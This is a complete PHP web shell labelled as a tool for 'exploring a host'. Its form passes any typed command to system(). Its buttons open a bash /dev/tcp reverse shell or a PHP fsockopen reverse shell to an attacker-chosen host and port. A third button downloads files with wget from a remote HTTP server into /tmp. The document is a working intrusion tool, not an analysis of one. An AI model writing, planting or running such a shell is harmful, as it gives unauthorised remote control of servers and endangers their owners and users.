<!-- Simple PHP for exploring a host -->                                                                 
<!DOCTYPE html>
<html>
<form  method="POST">
	Command:        
	<input type="text" name="mycmd">
        <input type="submit" name="btnGet" value="POST">
	<br><br>
	Reverse:
	<input type="text" name="lhost" value="192.168.1.12" size="10">
	<input type="text" name="lport" value="1234" size="5">
	<input type="submit" name="btnBash" value="Reverse Bash">
	<input type="submit" name="btnPhp" value="Reverse PHP">
	<br><br>
	HTTP Server:
	<input type="text" name="fileHost" value="192.168.1.12" size="10">
	<input type="text" name="filePort" value="8055" size="5">
	<input type="text" name="fileName" value="">
	<input type="submit" name="btnFile" value="Get file">
</form>
</html>
<?php
	$lhost = $_REQUEST['lhost'];
	$lport = $_REQUEST['lport'];

	$fileHost = $_REQUEST['fileHost'];
	$filePort = $_REQUEST['filePort'];
	$fileName = $_REQUEST['fileName'];

	if (isset($_REQUEST['btnBash'])) {
		$cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/$lhost/$lport 0>&1'";
	} else if (isset($_REQUEST['btnPhp'])) {
        	$cmd = "php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
	} else if (isset($_REQUEST['btnFile'])) {
        	$cmd = "wget http://$fileHost:$filePort/$fileName -O /tmp/$fileName";
    	} else {
		$cmd = $_REQUEST['mycmd'];
	}

	
	echo ('<br>');        
        echo($cmd);
        echo ('<br>');
	echo ('<br>');
	system("$cmd 2>&1", $return_value);
  	($return_value == 0) or die();
?>
